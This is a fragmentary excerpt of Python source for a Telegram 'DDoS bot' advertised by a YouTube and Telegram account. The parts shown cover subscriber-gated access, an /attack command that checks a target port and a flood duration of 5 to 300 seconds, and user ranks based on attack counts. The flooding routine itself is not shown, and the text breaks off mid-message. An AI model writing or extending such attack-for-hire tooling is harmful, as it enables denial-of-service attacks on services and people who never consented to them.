...
🔗 SOCIALS:
├ 📺 YouTube: https://youtube.com/@Roxz_gaming
├ 📱 Telegram: https://t.me/Roxz_gaming
└ 🐙 GitHub: /roxz
...
async def test(update: Update, context: CallbackContext):
    ...
    if current_subs < REQUIRED_SUBSCRIBERS:
        await context.bot.send_message(chat_id=chat_id, text="🔒 Bot locked! Subscribe to unlock.")
        return
...
async def support(update: Update, context: CallbackContext):
    ...
    keyboard = [
        [InlineKeyboardButton("👑 OWNER", url="https://t.me/Roxz_gaming")],
        [InlineKeyboardButton("📺 YOUTUBE", url=YOUTUBE_CHANNEL_LINK)],
        [InlineKeyboardButton("💬 SUPPORT GROUP", url="https://t.me/Roxz_gaming")],
        [InlineKeyboardButton("📢 UPDATES CHANNEL", url="https://t.me/Roxz_gaming")]
    ]
...
"""
        ...
        if user_id in users or user_id == str(ADMIN_USER_ID):
            attacks_done = verified_users.get(user_id, {}).get('attacks', 0)
            rank = '🔥 PRO' if attacks_done > 100 else '⚡ BEGINNER'
            message = f"""
╔══════════════════════════════════╗
║   🔥 ROXZ DDOS BOT 🔥          ║
║   POWERFUL NETWORK TOOL        ║
...
async def attack(update: Update, context: CallbackContext):
    ...
    if current_subs < REQUIRED_SUBSCRIBERS:
        await context.bot.send_message(chat_id=chat_id, text="🔒 BOT LOCKED!")
        return
    ...
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Invalid port! (1-65535)")
        return
    
    try:
        duration_int = int(duration)
        if duration_int < 5 or duration_int > 300:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ Duration must be 5-300 seconds!")
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Invalid duration!")
        return
...
""",
    ...
    try:
        ...
        rank = '🔥 PRO' if attacks_count > 100 else '⚡ BEGINNER'
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"""
╔══════════════════════════════════╗
